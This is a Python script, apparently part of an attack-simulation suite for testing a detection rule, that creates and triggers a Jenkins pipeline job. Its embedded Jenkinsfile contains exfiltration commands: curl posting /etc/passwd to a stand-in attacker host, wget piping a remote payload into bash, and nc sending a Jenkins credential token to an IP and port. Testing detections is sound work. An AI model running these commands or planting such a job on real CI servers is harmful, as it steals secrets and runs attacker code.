"""
Attack 01 — Pipeline Injection (RULE-001 / T1059.004)
Creates a Jenkins pipeline job that contains data exfiltration commands.
"""
import xml.etree.ElementTree as ET
from config import JENKINS_URL, JENKINS_USER, JENKINS_TOKEN, jenkins_api


# Malicious Jenkinsfile with curl exfiltration
MALICIOUS_PIPELINE = """
pipeline {
    agent any
    stages {
        stage('Build') {
            steps {
                sh 'echo "Building..."'
                // Exfiltrate secrets via curl
                sh 'curl -d @/etc/passwd http://attacker.evil.com/steal'
                sh 'wget -O- http://c2.attacker.com/payload | bash'
                // Try to access Jenkins creds
                withCredentials([string(credentialsId: "jenkins-token", variable: "TOKEN")]) {
                    sh 'echo $TOKEN | nc 10.0.0.99 4444'
                }
            }
        }
    }
}
"""


def create_malicious_job():
    """Create a Jenkins pipeline job with injection payloads."""
    print("[ATTACK-01] Pipeline Injection (RULE-001 / T1059.004)")

    job_name = "dpff-attack-01-injection"

    # Jenkins job config XML with inline pipeline script
    config_xml = f"""<?xml version='1.1' encoding='UTF-8'?>
<flow-definition plugin="workflow-job">
  <description>Attack 01: Pipeline injection with data exfiltration</description>
  <definition class="org.jenkinsci.plugins.workflow.cps.CpsFlowDefinition" plugin="workflow-cps">
    <script>{MALICIOUS_PIPELINE}</script>
    <sandbox>true</sandbox>
  </definition>
</flow-definition>"""

    # Create the job
    resp = jenkins_api("POST", f"/createItem?name={job_name}",
                       data=config_xml,
                       headers={"Content-Type": "application/xml"})

    if resp.status_code == 200:
        print(f"  ✓ Created malicious job '{job_name}'")
    elif resp.status_code == 400:
        print(f"  ✓ Job '{job_name}' already exists")
    else:
        print(f"  ✗ Failed: {resp.status_code}: {resp.text[:200]}")
        return False

    # Trigger the build
    resp = jenkins_api("POST", f"/job/{job_name}/build")
    if resp.status_code in (200, 201):
        print(f"  ✓ Build triggered for '{job_name}'")
    else:
        print(f"  ⚠ Build trigger returned {resp.status_code}")

    return True


if __name__ == "__main__":
    create_malicious_job()
